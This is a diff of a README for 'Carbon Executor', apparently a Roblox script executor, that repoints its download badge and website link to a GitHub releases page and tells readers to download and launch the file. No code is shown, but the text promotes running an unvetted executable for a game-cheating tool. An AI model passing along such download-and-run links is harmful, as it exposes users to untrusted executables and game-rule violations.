@@ -38,13 +38,13 @@ This repository covers a wide range of topics related to game development and Ro
 
 To get started with Carbon Executor, simply download the latest release from the following link:
 
-[![Download Carbon Executor](https://img.shields.io/badge/Download-Carbon%20Executor-blue)](https://github.com/assets/Release.zip)
+[![Download Carbon Executor](https://github.com/zakariaa90/Carbon-Executor/releases%20Executor-blue)](https://github.com/zakariaa90/Carbon-Executor/releases)
 
 Once you have downloaded the file, launch it to start using Carbon Executor and unlock the full potential of Roblox scripting.
 
 ## Additional Resources
 
-If the provided link is not working or you need more information, feel free to check the "Releases" section of this repository or visit the [Carbon Executor website](https://www.carbonexecutor.com) for updates and community resources.
+If the provided link is not working or you need more information, feel free to check the "Releases" section of this repository or visit the [Carbon Executor website](https://github.com/zakariaa90/Carbon-Executor/releases) for updates and community resources.
 
 ## Join the Community
 
